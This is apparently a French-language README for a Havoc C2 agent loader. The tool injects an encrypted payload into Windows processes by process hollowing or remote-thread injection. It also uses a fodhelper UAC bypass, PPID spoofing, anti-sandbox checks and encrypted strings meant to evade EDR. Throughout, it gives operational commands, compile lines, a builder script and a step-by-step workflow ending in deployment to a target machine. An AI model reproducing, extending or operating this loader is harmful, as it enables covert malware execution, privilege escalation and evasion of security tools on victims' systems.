# AES Loader - Havoc Agent Injector

Loader polyvalent pour injecter un agent Havoc chiffré en AES-256-CBC dans des processus Windows via **process hollowing**, **injection directe**, ou **UAC bypass**.

---

## 📊 Milestones & Roadmap

### ✅ Phase 1: Core Functionality (COMPLÈTE)
- [x] Process Hollowing (PE x64)
- [x] APC Injection (smart PE/shellcode detection)
- [x] UAC Bypass via fodhelper
- [x] PPID Spoofing
- [x] AES-256-CBC Encryption
- [x] Anti-Analysis Checks (virtualization + timing)
- [x] 4 Injection Modes (DEFAULT/HOLLOW/APC/UAC)
- [x] Config-driven EDR String Encryption
- [x] Automated Builder (builder.sh)
- [x] Meterpreter Reverse HTTPS Testing ✅ **VALIDATED**

### 🔄 Phase 2: OPSEC Enhancement (EN COURS)
- [ ] Polymorphic RC4 Decryption (Shoggoth-inspired)
- [ ] Direct Syscalls (NtCreateProcess, NtWriteVirtualMemory, etc)
- [ ] ETW Patching (EtwEventWrite + AMSI)
- [ ] API Obfuscation (hash-based GetProcAddress)
- [ ] Behavioral Evasion (jitter, chunk writes, delays)
- [ ] SysWhispers2 Integration

### 📋 Phase 3: Additional Features (PLANIFIÉE)
- [ ] DLL Loader (Reflective DLL Injection)
- [ ] COFF Loader (Beacon Object Files)
- [ ] Indirect Syscalls (more furtive)
- [ ] Code Obfuscation (dead code, polymorphic patterns)
- [ ] Memory Cleanup (ZeroMemory critical buffers)
- [ ] Advanced Anti-Debugging

### 🎯 Phase 4: Testing & Validation (À VENIR)
- [ ] Defender Evasion Rate Test
- [ ] Avira Evasion Rate Test
- [ ] VirusTotal Multi-AV Detection
- [ ] ProcessMonitor Baseline (zero API calls)
- [ ] Memory Forensics Analysis
- [ ] Behavioral Detection Tests

---

## 📈 Current Status

| Component | Status | Last Tested |
|-----------|--------|-------------|
| **Process Hollowing** | ✅ Working | 2025-12-30 |
| **APC Injection** | ✅ Working | 2025-12-30 |
| **UAC Bypass** | ✅ Working | 2025-12-30 |
| **PPID Spoofing** | ✅ Working | 2025-12-30 |
| **Meterpreter Integration** | ✅ Session Live | 2025-12-30 |
| **String Encryption** | ✅ Verified | 2025-12-30 |
| **Direct Syscalls** | 🔄 In Development | — |
| **Polymorphic Encryption** | 🔄 In Development | — |
| **ETW Patching** | 🔄 In Development | — |

---

## 🎯 Fonctionnalités

- 🔐 **Chiffrement AES-256-CBC** avec seed aléatoire de 42 bytes + PBKDF2
- 💉 **Process Hollowing** : Remplace l'image d'un processus suspendu par votre PE
- 🪡 **APC Injection Intelligente** : Détecte automatiquement PE vs shellcode brut
- 🛡️ **Anti-Analysis** : Vérification virtualization + timing pour détecter les sandboxes
- 🔄 **Gestion des relocations** : Fixe automatiquement les adresses si ImageBase change
- 👻 **PPID Spoofing** : Fait croire que le processus vient d'un parent différent
- 🚀 **UAC Bypass** : Élévation de privilèges via fodhelper

## 📋 Usage Rapide

### Mode DEFAULT (Spawn svchost + APC)
```bash
# Défaut: crée svchost et injecte via APC (aucun flag)
.\loader.exe -v

# Avec PPID spoofing
.\loader.exe --ppid 500 -v

# Avec anti-analysis checks
.\loader.exe -a -v
```

### Mode HOLLOW (Process Hollowing)
```bash
# Hollowing svchost (défaut)
.\loader.exe -m hollow -v

# Hollowing avec cible personnalisée
.\loader.exe -m hollow -f notepad.exe -v
.\loader.exe -m hollow -f C:\Windows\System32\calc.exe -v

# Avec PPID spoofing
.\loader.exe -m hollow --ppid 500 -v
```

### Mode APC (Existing Process Injection)
```bash
# Injection dans processus existant (PID 1464)
# Détecte automatiquement PE ou shellcode
.\loader.exe -m apc -p 1464 -v
```

### Mode UAC (Privilege Escalation)
```bash
# UAC bypass avec commande custom
.\loader.exe -m uac -c "calc.exe" -v

# UAC bypass: re-lance loader sans flag UAC (en mode DEFAULT élevé)
.\loader.exe -m uac -v
```

### Options Complètes
```
-m, --mode MODE         hollow|apc|uac (défaut: none = DEFAULT mode)
-v, --verbose           Logs détaillés de debug
-f, --file PATH         Cible du hollowing (défaut: svchost.exe)
-p, --pid PID           APC injection dans processus existant
--ppid PPID             PPID spoofing (défaut parent)
-c, --cmd COMMAND       Commande custom pour UAC mode
-a, --anti              Anti-analysis checks (auto avec -v)
-h, --help              Aide
```

## 🏗️ Architecture & Flux d'Exécution

### Phase 1: Initialisation
```
[Chiffrement]
  ├─ Seed 42 bytes (aléatoire)
  ├─ Clé PBKDF2 32 bytes
  └─ IV 16 bytes

[Anti-Analysis]
  ├─ Détection virtualization (HyperV, VirtualBox, VMware)
  └─ Vérification timing
```

### Phase 2: Détection du Payload
```
[Décryption]
  └─ Seed + ciphertext → Plaintext

[Détection Type]
  ├─ Si DOS signature (0x4D5A) + PE signature → PE Payload
  └─ Sinon → Raw Shellcode
```

### Phase 3a: Process Hollowing (PE)
```
[Création processus suspendu]
  ├─ CreateProcessW(target_exe, CREATE_SUSPENDED)
  └─ PPID Spoofing (optionnel avec PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)

[Parsing PE Header]
  ├─ DOS header (e_magic, e_lfanew)
  ├─ NT header (signature, ImageBase)
  └─ Section headers

[Allocation Mémoire]
  ├─ VirtualAllocEx à ImageBase préféré
  └─ Fallback allocation dynamique si occupée

[Injection PE]
  ├─ WriteProcessMemory: headers
  ├─ WriteProcessMemory: chaque section
  ├─ Relocation fixing (si delta ≠ 0)
  └─ PEB ImageBase update

[Exécution]
  ├─ GetThreadContext + SetThreadContext (RCX = EntryPoint)
  └─ ResumeThread
```

### Phase 3b: APC Injection (PE ou Shellcode)
```
[Détection Auto]
  ├─ Check DOS + PE signature → PE Path
  └─ Pas de signature → Shellcode Path

[PE Injection]
  ├─ OpenProcess(pid)
  ├─ VirtualAllocEx (try ImageBase, fallback dynamic)
  ├─ WriteProcessMemory (headers + sections)
  └─ CreateRemoteThread(EntryPoint)

[Shellcode Injection]
  ├─ OpenProcess(pid)
  ├─ VirtualAllocEx (dynamic)
  ├─ WriteProcessMemory (raw bytes)
  └─ CreateRemoteThread(shellcode_addr)
```

## 🔍 Détection Automatique: PE vs Shellcode

Le loader détecte **automatiquement** le type de payload:

```
PE Payload (MZ header):
  4d5a90000300000004000000ffff0000...
  ↓ MZ + PE signature
  → Injection PE complète (sections, relocations, PEB)

Raw Shellcode (code machine):
  564889e64883e4f04883ec20e80f0000...
  ↓ Pas de signature
  → Injection simple (allocation + thread)
```

**Logs de détection:**
```
[*] Smart injection - detecting payload type...
[*] Detected: PE payload
[+] Payload ImageBase: 0x140000000

OU

[*] Detected: Raw shellcode
[*] Allocating memory (103935 bytes)...
```

## 👻 PPID Spoofing

Change le parent apparent d'un processus:

```bash
# Normal: explorer.exe → loader.exe → svchost.exe
# Résultat: Parent de svchost = explorer

# Spoofé: svchost.exe → Parent PID 500
.\loader.exe -h -f svchost.exe --ppid 500
```

**Restrictions:**
- Nécessite droits administrateur
- Hollowing uniquement (pas APC)
- PID parent doit être valide

## 🚀 Cas d'Usage Typiques

| Scénario | Commande | Résultat |
|----------|----------|----------|
| **Injection basique** | `.\loader.exe -h` | svchost.exe créé + PE injecté |
| **Injection discrète** | `.\loader.exe -h -f notepad.exe` | notepad paraît actif |
| **PPID spoofing** | `.\loader.exe -h --ppid 500` | Process tree falsifié |
| **Injection existant** | `.\loader.exe -p 1464` | Auto-détecte PE/shellcode |
| **UAC + Hollowing** | `.\loader.exe -u -v -h -f calc.exe` | Auto-élévation |
| **Debug complet** | `.\loader.exe -v` | Logs PE, relocations, PEB |

## ⚠️ Restrictions & Limitations

### Privilèges Requis
- **Hollowing simple** : User normal ok
- **Hollowing + PPID** : Admin requis
- **Injection existant** : Dépend de la cible
- **UAC bypass** : User → Auto-relance en admin

### Format Payload
- **Hollowing** : PE complet (DOS + PE + sections) obligatoire
- **Injection** : PE ou shellcode brut (auto-détecté)
- **Architecture** : x64 uniquement

### Gestion ImageBase

| Situation | Comportement |
|-----------|-------------|
| ImageBase libre | Allocation à l'adresse préférée |
| ImageBase occupée | Allocation dynamique + relocation fixing |
| Pas de table reloc | Exécution à adresse aléatoire (risque crash) |

### Détections Possibles
- ✅ Anti-virtualization checks
- ✅ Timing verification
- ❌ Pas de anti-debugging
- ❌ Pas de code obfuscation

## 📦 Fichiers

| Fichier | Rôle |
|---------|------|
| `loader.cpp` | Point d'entrée, parsing args |
| `havoc_loader.cpp` | Déchiffrement |
| `process_hollower.cpp` | Hollowing (création + injection) |
| `process_injection.cpp` | Injection intelligente (PE + shellcode) |
| `crypto_funcs.cpp` | PBKDF2, hex utils |
| `easCipher42.cpp` | AES-256-CBC |
| `bypass_analysis.cpp` | Anti-VM + timing |
| `uac_bypass.cpp` | Elevation via fodhelper |
| `demon.x64.h` | Payload compilé (embedded) |
| `myenc.py` | Script de chiffrement |

## 🔧 Compilation

### Windows (MSVC)
```bash
cl /EHsc /std:c++17 /W4 ^
  loader.cpp havoc_loader.cpp process_hollower.cpp ^
  process_injection.cpp crypto_funcs.cpp ^
  bypass_analysis.cpp uac_bypass.cpp easCipher42.cpp ^
  /link kernel32.lib ntdll.lib advapi32.lib shell32.lib ole32.lib
```

### Linux (MinGW)
```bash
x86_64-w64-mingw32-g++ -std:c++17 -Wall -O2 \
  loader.cpp havoc_loader.cpp process_hollower.cpp \
  process_injection.cpp crypto_funcs.cpp \
  bypass_analysis.cpp uac_bypass.cpp easCipher42.cpp \
  -o loader.exe -lkernel32 -lntdll -ladvapi32 -lshell32 -lole32
```

## �️ EDR Evasion - Strings Chiffrées

Toutes les strings sensibles sont **chiffrées en AES-256** et déchiffrées **inline au runtime**:

### Strings Protégées
| String | Valeur | Protection |
|--------|--------|-----------|
| `registry_path_enc` | `Software\Classes\ms-settings\shell\open\command` | ✅ AES-256 |
| `delegate_execute_enc` | `DelegateExecute` | ✅ AES-256 |
| `shell_verb_enc` | `open` | ✅ AES-256 |
| `default_process_enc` | `C:\Windows\System32\svchost.exe` | ✅ AES-256 |
| `fodhelper_path_enc` | `C:\Windows\System32\fodhelper.exe` | ✅ AES-256 |

### Gestion
```bash
# Config: edr_strings.conf
fodhelper_path:C:\Windows\System32\fodhelper.exe
registry_path:Software\Classes\ms-settings\shell\open\command
delegate_execute:DelegateExecute
shell_verb:open
default_process:C:\Windows\System32\svchost.exe
```

### Vérification Anti-Détection
```bash
# Les strings ne doivent PAS être en clair
strings loader.exe | grep -i "DelegateExecute"    # ✅ Vide
strings loader.exe | grep -i "Software"           # ✅ Vide
strings loader.exe | grep -i "ms-settings"        # ✅ Vide
```

## � Builder Automatisé

### Flux Complet (builder.sh)

Le script **builder.sh** automatise l'ensemble du process:

```bash
# Usage: ./builder.sh <payload> <output_exe> <architecture>
./builder.sh demon.x64.exe loader.exe x64

# Ou avec chemins complets
./builder.sh /path/to/payload.bin ./loader.exe x64
```

**Étapes exécutées automatiquement:**

1. **Chiffrement du payload**
   ```
   python3 myenc.py <payload>
   ↓ Génère: demon.x64.h (payload_enc + strings chiffrées)
   ```

2. **Chiffrement des strings EDR** (via edr_strings.conf)
   ```
   edr_strings.conf → myenc.py → demon.x64.h
   ├─ fodhelper_path
   ├─ registry_path
   ├─ delegate_execute
   ├─ shell_verb
   └─ default_process
   ```

3. **Compilation du loader**
   ```
   g++ -std:c++17 -Wall -O2 \
     *.cpp -o loader.exe \
     -lkernel32 -lntdll -ladvapi32 -lshell32 -lole32
   ```

4. **Résultat**
   ```
   loader.exe (~453 KB) avec:
   ✅ Payload chiffré en AES-256
   ✅ Strings EDR chiffrées
   ✅ Aucune signature plaintext
   ```

### Configuration des Strings EDR

**Fichier:** `edr_strings.conf`
```ini
fodhelper_path:C:\Windows\System32\fodhelper.exe
registry_path:Software\Classes\ms-settings\shell\open\command
delegate_execute:DelegateExecute
shell_verb:open
default_process:C:\Windows\System32\svchost.exe
```

**Modification:** Éditer avant de lancer builder.sh
```bash
# Ajouter une nouvelle string
echo "new_var:C:\path\to\something" >> edr_strings.conf

# Puis relancer le builder
./builder.sh demon.x64.exe loader.exe x64
```

## 🔐 Chiffrement du Payload & Strings

### Format du Chiffrement

**Payload** (avec seed):
```
[seed (42 bytes - aléatoire)] + [ciphertext AES-256-CBC]
```

**Strings EDR** (sans seed - utilise seed du payload):
```
[ciphertext AES-256-CBC uniquement]
```

### Processus de Déchiffrement Runtime

```
Phase 1: Déchiffrement du payload
  ├─ Read seed (42 bytes)
  ├─ PBKDF2(seed) → key (32b) + iv (16b)
  └─ AES-256-CBC decrypt → Payload plaintext

Phase 2: Déchiffrement inline des strings EDR
  ├─ easCipher42 utilise même key/iv
  ├─ Déchiffre registry_path à la demande (UAC mode)
  ├─ Déchiffre delegate_execute à la demande
  ├─ Déchiffre shell_verb à la demande
  ├─ Déchiffre default_process à la demande
  └─ Déchiffre fodhelper_path à la demande (UAC mode)
```

### Exemple: Déchiffrement Inline (uac_bypass.cpp)

```cpp
// Constructor reçoit easCipher42 par référence
UACBypass(const std::string& cmd,
          const uint8_t* fh_enc, size_t fh_enc_size,
          easCipher42& cipher, bool verbose)

// À l'exécution:
std::vector<uint8_t> registry_path_plain =
  cipher.decrypt(registry_path_enc, registry_path_enc_len);
// → "Software\Classes\ms-settings\shell\open\command"

std::vector<uint8_t> delegate_execute_plain =
  cipher.decrypt(delegate_execute_enc, delegate_execute_enc_len);
// → "DelegateExecute"
```

## 🐛 Debugging

### Activer Verbose
```bash
.\loader.exe -v
```

Affiche:
- Vérifications anti-analysis
- Clés/IVs
- Parsing PE (arch, ImageBase)
- Allocation mémoire (adresses)
- Sections écrites
- Relocations
- Contexte thread

### Logs Importants
```
[+] Payload ImageBase: 0x140000000      ← PE bien déchiffré
[+] Memory allocated at: 0x140000000    ← Alloc ok
[+] Relocations fixed                   ← Pas de crash reloc
[+] Process created: PID 5678           ← Process créé
[+] SUCCESS                             ← Exécution ok
```

## 🚨 Vérification Anti-Signature

### Avant et Après Chiffrement

```bash
# AVANT (strings plaintext)
strings demon.x64.exe | grep -i "DelegateExecute"
# Result: DelegateExecute (à éviter!)

# APRÈS (avec builder.sh)
strings loader.exe | grep -i "DelegateExecute"
# Result: (vide - chiffré ✅)

strings loader.exe | grep -i "Software"
# Result: (vide - chiffré ✅)

strings loader.exe | grep -i "ms-settings"
# Result: (vide - chiffré ✅)
```

### Vérification Complète

```bash
#!/bin/bash
echo "=== Vérification signatures EDR ==="
for sig in "DelegateExecute" "Software" "ms-settings" "fodhelper" "svchost"; do
  count=$(strings loader.exe | grep -ci "$sig")
  if [ $count -eq 0 ]; then
    echo "[✅] $sig: Chiffré"
  else
    echo "[-] $sig: PLAINTEXT (non chiffré!)"
  fi
done
```

## 🔗 Intégration Complète

### Workflow Standard

```
1. Générer/Obtenir payload Havoc
   demon.x64.exe ou demon.x64.bin

2. Éditer configuration strings EDR
   vim edr_strings.conf

3. Lancer builder automatisé
   ./builder.sh demon.x64.exe loader.exe x64

4. Vérifier absence signatures
   strings loader.exe | grep -i "DelegateExecute"  # Doit être vide

5. Déployer loader.exe
   Transférer vers cible Windows

6. Exécuter injection
   ./loader.exe -m hollow -v  # Ou autre mode
```

### Exemple Complet

```bash
#!/bin/bash
set -e

PAYLOAD="demon.x64.exe"
OUTPUT="loader_final.exe"

echo "[*] Étape 1: Configuration strings EDR"
cat > edr_strings.conf << EOF
fodhelper_path:C:\Windows\System32\fodhelper.exe
registry_path:Software\Classes\ms-settings\shell\open\command
delegate_execute:DelegateExecute
shell_verb:open
default_process:C:\Windows\System32\svchost.exe
EOF

echo "[*] Étape 2: Lancer builder"
./builder.sh "$PAYLOAD" "$OUTPUT" x64

echo "[*] Étape 3: Vérification signatures"
if strings "$OUTPUT" | grep -iq "DelegateExecute"; then
    echo "[-] ERREUR: DelegateExecute en plaintext!"
    exit 1
fi

echo "[+] Build réussi: $OUTPUT"
ls -lh "$OUTPUT"
```

---

**Version:** 2.0 | **Date:** 2025-12-30 | **Support:** PE x64 + 4 modes d'injection
